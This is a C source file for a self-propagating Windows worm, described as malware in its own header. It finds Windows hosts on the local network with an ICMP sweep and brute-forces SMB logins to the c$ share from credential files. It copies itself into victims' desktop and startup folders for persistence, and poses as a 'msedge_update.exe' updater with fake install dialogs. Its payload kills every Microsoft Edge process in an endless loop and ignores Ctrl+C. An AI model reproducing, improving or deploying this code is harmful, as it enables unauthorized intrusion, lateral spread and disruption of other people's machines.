/*
Author: Perseus06
Date: 31/10/2026
Name: worm.c
Description: Worm malware targeting windows endpoints, with the ability to scan the network with ICMP and propagate using SMB.
The worm also executes a payload over the host, and creates a copy of it self in the system startup folder.

to compile with gcc: gcc worm.c -o msedge_update.exe -lws2_32 -lmpr
*/

#include <stdio.h>
#include <winsock2.h>
#include <windows.h>
#include <tlHelp32.h>
#include <signal.h>
#include <string.h>
#include <winnetwk.h>
#include <ctype.h>

#pragma comment(lib,"ws2_32.lib")
#pragma comment(lib,"mpr.lib")

#define PROCESS_NAME L"msedge.exe"
#define DEBUG_PRIVILEGE_NAME "SeDebugPrivilege"
#define ICMP_PACKET_DATA "I pray this is gonna work"
#define ICMP_HEADER_SIZE 8
#define ICMP_PACKET_SIZE 34
#define IP_HEADER_SIZE 20
#define TTL_CHAR_INDEX_IN_IP_PACKET 8
#define ICMP_TYPE_CHAR_INDEX_IN_ICMP_PACKET 20
#define USERNAMES_FILE_NAME "data1_for_msedge_update.txt"
#define PASSWORDS_FILE_NAME "data2_for_msedge_update.txt"
#define EXECUTABLE_DEFAULT_FILE_NAME "msedge_update.exe"
#define EXECUTABLE_STARTUP_PATH "\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\msedge_update.exe"
#define USERNAMES_FILE_PATH "c:\\users\\public\\documents\\data1_for_msedge_update.txt"
#define PASSWORDS_FILE_PATH "c:\\users\\public\\documents\\data2_for_msedge_update.txt"

char *WormFilePath;


// creating a struct that defines the ICMP header (8 bytes).
struct ICMP_HEADER{
    unsigned char Type;
    unsigned char Code;
    unsigned short Checksum;
    unsigned short Id;
    unsigned short Sequence;
};


// function that invokes the winsock2 library, in order to use sockets in the program.
int StartWinsock()
{
    int answer;
    WSADATA WinsockData;
    answer = WSAStartup(MAKEWORD(2,2) , &WinsockData);
    if (answer==0)
    {
        return 0;
    }
    else
    {
        printf("a problem occured while trying to use winsock2 (WSAStartup failed).\nerror code: %d\n", answer);
        return -1;
    }
}


// function for getting SeDebug privilege, in order to gain the ability of accessing the memory of secured processes in the OS.
int GetSeDebugPrivilege()
{
	// get a handle to the program process (the worm).
	int SelfProcessPID, IsSucceeded;
	SelfProcessPID = GetCurrentProcessId();
	HANDLE ProcessHandle = OpenProcess(PROCESS_QUERY_INFORMATION, 0, SelfProcessPID);
	if (ProcessHandle == INVALID_HANDLE_VALUE || ProcessHandle == NULL)
	{
		return -1;
	}

	// get handle to the token of the program process.
	HANDLE SelfProcessToken;
	IsSucceeded = OpenProcessToken(ProcessHandle, TOKEN_ADJUST_PRIVILEGES, &SelfProcessToken);
	if (IsSucceeded == 0)
	{
		return -1;
	}

	// define the SeDebugPrivilege.
	LUID_AND_ATTRIBUTES DebugPrivilege;
	IsSucceeded = LookupPrivilegeValueA(NULL, DEBUG_PRIVILEGE_NAME, &(DebugPrivilege.Luid));
	if (IsSucceeded == 0)
	{
		return -1;
	}
	DebugPrivilege.Attributes = SE_PRIVILEGE_ENABLED;

	// set SeDebug privilege to the program process.
	TOKEN_PRIVILEGES NewPrivileges;
	NewPrivileges.PrivilegeCount = 1;
	NewPrivileges.Privileges[0] = DebugPrivilege;
	IsSucceeded = AdjustTokenPrivileges(SelfProcessToken, 0, &NewPrivileges, 0, NULL, NULL);
	if (IsSucceeded == 0)
	{
		return -1;
	}
	return 0;
}


// SIGINT (ctrl+c) signal handling 
void SignalHandler()
{
    printf("think you are smart? I am smarter.\n");
}


// function for creating persistency by creating a copy of the worm executable in the startup folder of the computer.
// the function will fail if the program is not executed with admin privileges.
void LocalPersistency()
{
    char LocalStartup[128];
    memset(LocalStartup, 0, 128);

    // create the full path to the startup of this computer.
    strcat(LocalStartup, "c:");
    strcat(LocalStartup, EXECUTABLE_STARTUP_PATH);
    printf(LocalStartup);

    // copy the worm executable to the startup folder of this computer.
    CopyFileA(WormFilePath, LocalStartup, 1);

    printf("\ncreated local persistency %d\n", GetLastError());
}


// function for creating remote persistency - a copy of the worm will be saved in the startup folder of the victim, so the worm will be executed automatically in each startup of the host.
void RemotePersistency(char PathToc$[32])
{
    char RemoteStartup[128];
    memset(RemoteStartup, 0, 128);

    // create the path to the startup directory under the c$ and save it in the PathToExecutable_Startup variable.
    strcat(RemoteStartup, PathToc$);
    strcat(RemoteStartup, EXECUTABLE_STARTUP_PATH);

    // create a copy of the worm file and the .txt files from our computer to the victim's the startup folder.
    // the third parameter (1) states that if the file is already in the startup folder, a copy will not be created.
    CopyFileA(WormFilePath, RemoteStartup, 1);
}


// function for getting the endpoint self IP address.
struct in_addr GetMyIPv4Address()
{
    // define the IPv4 address as NULL.
    //if the function failed to retreive an actual address, the NULL will be returned and Propagate() will stop the propagation.
    struct in_addr SelfIP;
    SelfIP.s_addr = 0;

    // get the host name of the endpoint.
    char HostName[64];
    if(gethostname(HostName, 64)!=0)
    {
        printf("could not get self IP address.\nerror code: %d", GetLastError());
        return SelfIP;
    }
    // from the host name, extract the network info of the host.
    struct hostent HostNetworkInfo;
    HostNetworkInfo = *gethostbyname(HostName);

    //  only in case the IP address is an IPv4, extract and return the actual address.
    if(HostNetworkInfo.h_addrtype==AF_INET)
    {
        int i;
        i=0;

        // iterating for cases of multipile IPv4 addresses. the function will return the last IPv4 found.
        while(HostNetworkInfo.h_addr_list[i]!=0)
        {
            SelfIP.s_addr = *(u_long *)(HostNetworkInfo.h_addr_list[i]);
            i++;
        }
    }
    return SelfIP;
}


// create an ICMP packet and filling the fields with the constant values (no dependency on the victim).
char* CreateICMPRequestPacket()
{
    // allocate heap memory for the packet
    char* GenericICMPRequest;
    GenericICMPRequest = (char *)malloc(ICMP_PACKET_SIZE);
    memset(GenericICMPRequest, 0, ICMP_PACKET_SIZE);

    // create the ICMP header of the packet, add to the packet and fill the fields with constant values.
    struct ICMP_HEADER* GenericICMPHeader;
    GenericICMPHeader = (struct ICMP_HEADER*) GenericICMPRequest;
    GenericICMPHeader->Type = 8;
    GenericICMPHeader->Code = 0;
    GenericICMPHeader->Checksum = 0;
    GenericICMPHeader->Id = 1;
    GenericICMPHeader->Sequence = 1;

    // append the data part to the ICMP request packet.
    strcat(GenericICMPRequest+ICMP_HEADER_SIZE, ICMP_PACKET_DATA);

    // calculate checksum for the ICMP header.
    unsigned short *Buffer;
    Buffer = (unsigned short*) GenericICMPRequest;
    int size;
    size = ICMP_PACKET_SIZE;
    int cksum;
    cksum=0;
    while (size > 1)
    {
        cksum += *Buffer++;
        size -= sizeof(unsigned short);
    }
    if (size)
    {
        cksum += *(unsigned char*)Buffer;
    }
    cksum = (cksum >> 16) + (cksum & 0xffff);
    cksum += (cksum >>16);
    GenericICMPHeader->Checksum = (unsigned short)(~cksum);

    return GenericICMPRequest;
}


// function for sending a built ICMP request packet to a victim.
int SendICMPRequset(SOCKET ICMPSocket, struct in_addr VictimIP, struct sockaddr_in VictimConnection, char* ICMPRequest)
{    
    // send the ICMP echo request packet to the current possible victim in the iteration.
    int check;
    check = sendto(ICMPSocket, ICMPRequest, ICMP_PACKET_SIZE, 0, (struct sockaddr*)&VictimConnection, sizeof(VictimConnection));

    // for case an error occured when trying to send an ICMP packet, the program will check the reason.
    if(check==SOCKET_ERROR)
    {
        // if the error code is 10013 (permission denied), it means the progrram is not running as admin.
        // the program will ask the victim to run as admin and terminate itself.
        if(WSAGetLastError()==10013)
        {
            MessageBoxA(NULL, TEXT("The file must be run as administrator in order to update msedge."), TEXT("error"), MB_OK);
            exit(0);
        }
        
        // if unknown error occured, return -1.
        else
        {
            return -1;
        }
    }
    return 0;
}


// function for receiving an ICMP response, after sending an ICMP request using SendICMPRequest().
// if no response if found, the function returns -1. else, the function returns the TTL of the victim.
unsigned char ReceiveTTLFromICMPResponse(SOCKET ICMPSocket, struct sockaddr_in VictimConnection, char *ICMPResponse)
{
    // initial variables for the recvfrom() function.
    int VictimConnectionSize, WSALastError;
    VictimConnectionSize = sizeof(VictimConnection);
    int SuccessfullyReceived;

    // receive the packet from the socket.
    SuccessfullyReceived = recvfrom(ICMPSocket, ICMPResponse, ICMP_PACKET_SIZE+IP_HEADER_SIZE, 0, (struct sockaddr*)&VictimConnection, &VictimConnectionSize);
    
    // if an error occured
    if(SuccessfullyReceived==SOCKET_ERROR)
    {
        WSALastError = WSAGetLastError();
        // errors 10040 and 10060 are normal and happen because the program doesn't wait much time for a response.
        // so those errors are fine. any other error, not fine and i need to check the cause of it.
        if((WSALastError!=10040)&&(WSALastError!=10060))
        {
            printf("error %d\n\n", WSAGetLastError());
        }
    }

    // if recvfrom() could actually receive a packet.
    else
    {
        // confirming that the ICMP packet we received is an ICMP response, by checking the Type value in the ICMP header (ICMP response has Type=0).
        // the ICMP_TYPE_CHAR_INDEX_IN_ICMP_PACKET variable represents the index of the char containing the Type value.
        unsigned char Type;
        Type = ICMPResponse[ICMP_TYPE_CHAR_INDEX_IN_ICMP_PACKET];
        if(Type==0)
        {
            // the TTL is a single byte (char) in the IP header, and it is the ninth byte in it.
            // the IP header is the beginning of the whole ICMP response packet.
            // therefore, the ninth byte in an ICMP packet will always be the TTL, in the IP header. the ninth byte is the char in index 8, because the index begins from 0 and not 1.
            unsigned char TTL;
            TTL = (unsigned char) ICMPResponse[TTL_CHAR_INDEX_IN_IP_PACKET];
            return TTL;
        }
    }
    return 0;
}


// function that maps the network in order to find the next victim in the LAN.
struct in_addr Reconnaissance(struct in_addr SelfIP, struct in_addr StartingPointIP)
{
    // creating an ICMP raw socket.
    SOCKET ICMPSocket;
    ICMPSocket = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
    if(ICMPSocket==INVALID_SOCKET)
    {
        printf("could not create an ICMP socket to do the reconnaissance. error code: %d\n", WSAGetLastError());
    }

    // configuring longest waiting time (in milliseconds) for receiving a packet in the socket.
    // useful for the ICMP reconnaissance, because that way the program is not waiting a lot of time for response from the unexisting IP addresses.
    DWORD WaitingTimems;
    WaitingTimems = 500;
    setsockopt(ICMPSocket, SOL_SOCKET, SO_RCVTIMEO, (char*)&WaitingTimems, sizeof(DWORD));
    
    // create an ICMP request that will be sent to the victim.
    char* ICMPRequest;
    ICMPRequest = CreateICMPRequestPacket();

    // allocate memory for the received ICMP response packet.
    char* ICMPResponse;
    ICMPResponse = (char *)malloc(ICMP_PACKET_SIZE+IP_HEADER_SIZE);
    memset(ICMPResponse, 0, ICMP_PACKET_SIZE+IP_HEADER_SIZE);

    // create an in_addr struct that represents a victim's IPv4.
    struct in_addr VictimIP;
    VictimIP = SelfIP;

    // create a sockaddr_in struct that represents the ICMP connection with a victim.
    struct sockaddr_in VictimConnection;
    VictimConnection.sin_family = AF_INET;
    VictimConnection.sin_port = htons(0);

    // extract the last octat from the self IP address, which is the host ID part of the address.
    // extract also the last octat of the starting point IP. the idea is that if we already found a victim but could not attack him, the function will start the reconnaissance again from the last victim we found and not from our self IP.
    unsigned char LastOctatInSelfIP, LastOctatInStartingPointIP, CurrentHostID;
    LastOctatInSelfIP = SelfIP.S_un.S_un_b.s_b4;
    LastOctatInStartingPointIP = StartingPointIP.S_un.S_un_b.s_b4;

    int SuccessfullySent;
    unsigned char VictimTTL;
    
    // starting to find IP addresses with host ID higher than the starting point ((starting point host ID+1) to 254)
    for(CurrentHostID=LastOctatInStartingPointIP+1; CurrentHostID<=254; CurrentHostID++)
    {
        printf("Current ID: %d\n", CurrentHostID);

        // iterating over each possible IP in the range of the loop, in order to trying to find the next victim.
        VictimIP.S_un.S_un_b.s_b4 = CurrentHostID;
        VictimConnection.sin_addr = VictimIP;

        // send the packet using SendICMPRequest().
        SuccessfullySent= SendICMPRequset(ICMPSocket, VictimIP, VictimConnection, ICMPRequest);

        // -1 is returned if an error occured when trying to send ICMP packet.
        // in case of failure, the function continue to the next IP address, in hope the next time will be successful.
        if (SuccessfullySent==-1)
        {
            continue;
        }
        else
        {
            // if we found an existing endpoint with TTL between 64 and 128, we finally found a windows endpoint in the LAN - our next victim.
            // the function will free all it's resources and return the IP address of the next victim.
            VictimTTL = ReceiveTTLFromICMPResponse(ICMPSocket, VictimConnection, ICMPResponse);
            Sleep(100);
            if ((VictimTTL>64)&&(VictimTTL<=128))
            {
                printf("found victim: %s\n", inet_ntoa(VictimIP));
                free((void*)ICMPResponse);
                free((void*)ICMPRequest);
                closesocket(ICMPSocket);
                return VictimIP;
            }
        }
    }

    // if no IP address with higher host ID was found, the program will check the lower host ID's possible IPs (1 to self host ID)
    for(CurrentHostID=1; CurrentHostID<=LastOctatInSelfIP-1; CurrentHostID++)
    {
        printf("Current ID: %d\n", CurrentHostID);

        // iterating over each possible IP in the range of the loop, in order to trying to find the next victim.
        VictimIP.S_un.S_un_b.s_b4 = CurrentHostID;
        VictimConnection.sin_addr = VictimIP;

        // send the packet using SendICMPRequest().
        SuccessfullySent= SendICMPRequset(ICMPSocket, VictimIP, VictimConnection, ICMPRequest);

        // -1 is returned if an error occured when trying to send ICMP packet.
        // in case of failure, the function continue to the next IP address, in hope the next time will be successful.
        if (SuccessfullySent==-1)
        {
            continue;
        }
        else
        {
            // if we found an existing endpoint with TTL between 64 and 128, we finally found a windows endpoint in the LAN - our next victim.
            // the function will free all it's resources and return the IP address of the next victim.
            VictimTTL = ReceiveTTLFromICMPResponse(ICMPSocket, VictimConnection, ICMPResponse);
            Sleep(100);
            if ((VictimTTL>64)&&(VictimTTL<=128))
            {
                printf("found victim: %s\n", inet_ntoa(VictimIP));
                free(ICMPResponse);
                free(ICMPRequest);
                closesocket(ICMPSocket);
                return VictimIP;
            }
        }
    }

    // when the reconnaissance is finished, the function will free all it's resources and return the self IP address to notify a failure.
    closesocket(ICMPSocket);
    free(ICMPRequest);
    free(ICMPResponse);
    return SelfIP;
}


// function for trasferring the worm file to the next victim, using the c$ share and SMB brute force.
// the function gets the IP address of the victim, and responsible for spreading the worm to this IP address.
int HereIComeMF(struct in_addr VictimIP)
{
    int result = -1;

    // create a string for the path to the c$ of the victim.
    char PathToC$[32], RemoteWormPath[128];
    PathToC$[0]='\0';
    strcat(PathToC$, "\\\\");
    strcat(PathToC$, inet_ntoa(VictimIP));
    strcat(PathToC$, "\\c$");

    // create a NETRESOURCEA struct that represents the c$ share in the victim's machine.
    // NETRESOURCEA is the struct for representing shared resources, like the c$ directory.
    NETRESOURCEA VictimC$Share;
    VictimC$Share.dwType = RESOURCETYPE_DISK;
    VictimC$Share.lpLocalName = 0;
    VictimC$Share.lpRemoteName = PathToC$;
    VictimC$Share.lpProvider = 0;

    // create a buffer to hold the username and password in each iteration of the SMB brute force.
    char CurrentUsername[64], CurrentPassword[64];

    // opening the file containing the usernames, and check if the file handle is valid.
    FILE *Usernames, *Passwords;
    Usernames = fopen(USERNAMES_FILE_PATH, "r");
    if (Usernames==NULL)
    {
        printf("could not open the usernames file. error: %d\n", GetLastError());
        return -1;
    }

    // starting the SMB brute force over the victim's c$ share.
    // each username will be tried with all the passwords one by one, until a successful connection is established.
    while(fgets(CurrentUsername, 64, Usernames))
    {
        // when reading a line from .txt, sometimes the newline char can enter to the buffer.
        // if the last char is truly the newline, remove it because it is not part of the actual username.
        if(CurrentUsername[strlen(CurrentUsername)-1]=='\n')
        {
            CurrentUsername[strlen(CurrentUsername)-1]='\0';
        }
        
        // opening the file containing the passwords, and check if the file handle is valid.
        Passwords = fopen(PASSWORDS_FILE_PATH, "r");
        if (Passwords==NULL)
        {
            printf("could not open the passwords file. error: %d\n", GetLastError());
            fclose(Usernames);
            return -1;
        }

        // after the function got a username from the usernames.txt file, it will try to connect with all the passwords in the passwords.txt file.
        // that way, all the possible combinations will be tried without doubt.
        while(fgets(CurrentPassword, 64, Passwords))
        {
            if(CurrentPassword[strlen(CurrentPassword)-1]=='\n')
            {
                CurrentPassword[strlen(CurrentPassword)-1]='\0';
            }

            // try to connect to the c$ with the current set of credentials.
            printf("username: %s, password: %s\n", CurrentUsername, CurrentPassword);
            result = WNetAddConnection2A(&VictimC$Share, CurrentPassword, CurrentUsername, CONNECT_TEMPORARY);

            // if connection succeeded (returned 0), break the loop and close the handles to the files, they are not necessary anymore.
            if (result==0)
            {
                printf("connection to c$ established.\n");
                fclose(Usernames);
                fclose(Passwords);
                break;
            }

        }
        fclose(Passwords);
        printf("\n");
    }
    fclose(Usernames);

    // check if got here because connection was successfully established (result is 0) or just because the list of usernames had come to an end.
    if (result==0)
    {
        // create the full path to the worm in the c$ share, by adding username found in the SMB brute force and desktop path.
        RemoteWormPath[0]='\0';
        strcat(RemoteWormPath, PathToC$);
        strcat(RemoteWormPath, "\\users\\");
        strcat(RemoteWormPath, CurrentUsername);
        strcat(RemoteWormPath, "\\desktop\\msedge_update.exe");

        // try to copy the worm file from our computer to the victim desktop through the c$ share. if failed, print error code and disconnect from the c$ share.
        if(CopyFileA(WormFilePath, RemoteWormPath, 1)==0)
        {
            // if the file could not be copied, check the error.
            // error code 80 means the file already exists, which means the worm had already propagated to the victim, and therefore there is no reason to worry.
            int Error;
            Error = GetLastError();
            if(Error==80)
            {
                printf("worm is already on the host machine, no need to propagate:)\n");
            }

            // in case the error code is different than 80, check what is the problem.
            else
            {
                printf("error while trying to copy the file to the victim c$: %d\n", GetLastError());
            }

            // close the connection to the victim's c$ and return -1 because the victim already has the worm, so no need to propagate.
            WNetCancelConnection2A(PathToC$, 0, 1);
            return -1;
        }
        
        // we copied the actual worm, but for the worm to work on the victim's computer, we need also to copy usernames and passwords files.
        char DestinationPathUsers[128], DestinationPathPasswords[128];
        DestinationPathUsers[0] = '\0';
        DestinationPathPasswords[0] ='\0';

        // build the usernames file destination path (remote public documents).
        strcat(DestinationPathUsers, PathToC$);
        strcat(DestinationPathUsers, "\\users\\public\\documents\\");

        // after creating the identical part of the paths in usernames path, copy it to the passwords path (contain path to remote desktop only, without including the files names).
        strcat(DestinationPathPasswords, DestinationPathUsers); 

        // add each path it's file name.
        strcat(DestinationPathUsers, USERNAMES_FILE_NAME);
        strcat(DestinationPathPasswords, PASSWORDS_FILE_NAME);
        

        // trying to copy also the .txt files to continue the propagation from the victim endpoint.
        if ((CopyFileA(USERNAMES_FILE_PATH, DestinationPathUsers,1)==0) || (CopyFileA(PASSWORDS_FILE_PATH, DestinationPathPasswords,1)==0))
        {
            printf("could not send the passwords and usernames files, so propagation won't continue.\natleast the victim has the malware.\nerror: %d\n\n", GetLastError());
        }

        // after copying the files to the desktop of the victim, the program adds a little bonus and add the files to the startup folder of the remote computer.
        // this is for creating persistency on the remote computer, and making sure the worm will run on the victim even if the victim does not want that.
        RemotePersistency(PathToC$);

        // if got here - it means everything went fine and the file was successfully copied.
        // therefore return 0 and close the connection to the c$.
        WNetCancelConnection2A(PathToC$, 0, 1);
        printf("successfully propagateddddd!!!!!!!!\n\n");
        return 0;
    }
    
    // if result is not 0, it means the loop was ended natively because all the usernames and passwords were not good.
    // in this case, the brute force has failed, and the function will return -1.
    else
    {
        printf("could not connect with SMB to c$.\nerror: %d\n", GetLastError(), result);
        return -1;
    }
}


// function that manages the propagation of the worm to the next victim.
int Propagate()
{
    // get self IPv4 address by calling GetMyIPv4Address();
    struct in_addr SelfIP;
    SelfIP = GetMyIPv4Address();

    // in case IPv4 could not be found by the program, finish the propagation process.
    if (SelfIP.s_addr==0)
    {
        printf("no self IPv4 detected.\n");
        return -1;
    }

    int DidPropagationSucceeded;
    DidPropagationSucceeded = -1;

    struct in_addr NextVictim;
    NextVictim = Reconnaissance(SelfIP, SelfIP);
    while (1)
    {
        // Reconnaissance() returns the self IP if an error occured.
        //in that case, the propagating process will not happen, and the program will run only the payload.
        if(NextVictim.S_un.S_addr==SelfIP.S_un.S_addr)
        {
            printf("could not find any other windows endpoint in the LAN, propagating failed..:(");
            return -1;
        }

        // if Reconnaissance() did find a victim, the program calls HereIComeMF() in order to copy the worm file to the remote machine of the victim.
        else
        {
            printf("found a next victim!\nIP address: %s\n", inet_ntoa(NextVictim));
            DidPropagationSucceeded = HereIComeMF(NextVictim);

            // if the worm could not propagate to the found victim, the program continue to reconnaissance from the last victim as starting point.
            if (DidPropagationSucceeded==-1)
            {
                NextVictim = Reconnaissance(SelfIP, NextVictim);
            }

            // if the worm did propagate, everything is good!! therefore terminating the function.
            else
            {
                return 0;
            }
        }
    }
}


/* executing message boxes so the program will look like a legit updater.
when the victim cliks OK in "click OK to install", the program will call the Propagate() function.
that way, there is a waiting time that looks real for the victim, and the program can continue to spread in the network.*/
void MakeItLookLegit()
{
    MessageBoxA(NULL, TEXT("Click OK to install the update (can take a few minutes)"), TEXT("msedge_update"), MB_OK);
    Propagate();
    MessageBoxA(NULL, TEXT("Successfully installed the update!"), TEXT("msedge_update"), MB_OK);
}


/* function that searches any process named msedge.exe, and returns it's PID. */
int SearchForEdge()
{
	// receiving a handle to a snapshot of all processes running in the system.
	HANDLE Snapshot;
	Snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	// if an error occured and the snapshot handle is inavlid, stop the program.
	if (Snapshot == INVALID_HANDLE_VALUE)
	{
		return -1;
	}

	/* iterating over the active process links in order to find any msedge process.
	   notice that all the iteration is based on wchar and not char. had to do it because of visual studio's configuration, it does no affect the program at all.*/
	PROCESSENTRY32W CurrentProcessInfo;
	CurrentProcessInfo.dwSize = sizeof(PROCESSENTRY32W);
	Process32FirstW(Snapshot, &CurrentProcessInfo);
	while (Process32NextW(Snapshot, &CurrentProcessInfo))
	{
		// if the function finds a process that it's name is the msedge process name, we found msedge.
		if (lstrcmpW(CurrentProcessInfo.szExeFile, PROCESS_NAME)==0)
		{
			// the function returns the PID of the msedge.exe process found.
			return CurrentProcessInfo.th32ProcessID;
		}
	}
	return -1;
}


// function that terminates a given PID. the program will call this function for each msedge process found on the system.
void NoEdgeToday(int PID)
{
    // get a handle to the edge process, base on its PID found eariler by SearchForEdge().
    HANDLE EdgeHandle;
    EdgeHandle = OpenProcess(PROCESS_TERMINATE, 0, PID);

    // if the handle is invalid, the malware cannot execute it's payload - terminating edge continuously.
    // therefore the program terminates itself.
    if (EdgeHandle==INVALID_HANDLE_VALUE || EdgeHandle==NULL)
    {
        exit(0);
    }
    
    // if the handle is valid, terminate edge!
    TerminateProcess(EdgeHandle, 0);
}


int main()
{
    // ================ REQUIERMENTS FOR RUNNING ==============

    // invoking the winsock2 library. if failed, the program terminates.
    if (StartWinsock()==-1)
    {
        return -1;
    }

    // trying to acheive the SeDebug privilege in order to terminate more secured processes in the system.
    // this phase is only a bonus, and does not have to succeed.
    if(GetSeDebugPrivilege()==-1)
    {
        printf("Couldn't acheive SeDebug, probably not an admin.");

    }

    // get the path of the executable file of the worm. by default the name is msedge_update.exe, but the name might be changed.
    // the path of the executable is used afterwards by the program.
    WormFilePath = malloc(256);
    if (GetModuleFileNameA(NULL, WormFilePath, 256)==0)
    {
        // if getting the worm's executable path had failed (0 is returned), use default name ass relative path.
        WormFilePath = EXECUTABLE_DEFAULT_FILE_NAME;
    }
    printf("worm path: %s\n", WormFilePath);
    // call LocalPersistency() to gain persistency over the current computer by copying the worm executable to the startup folder.
    LocalPersistency();

    // ================ PAYLOAD ==================

    // calling function that creates legit message boxes like updater messages.
    // this function calls the propagation function in order to make the worm spread in the network.
    MakeItLookLegit();

    // in infinite loop, let the program terminate every show of msedge.exe exists in the system.
    int ProcessID;
    while(1)
    {
        // call a signal handler for ctrl+c (SIGINT) so the program cannot be stopped.
        signal(SIGINT, (void(*)(int))SignalHandler);
        
        // if existing, get the PID of a msedge.exe process
        ProcessID = SearchForEdge();

        // if a msedge.exe process was found by SearchForEdge(), terminate it.
        if(ProcessID!=-1)
        {
            NoEdgeToday(ProcessID);            
        }
    }
    
    
    return 0;
}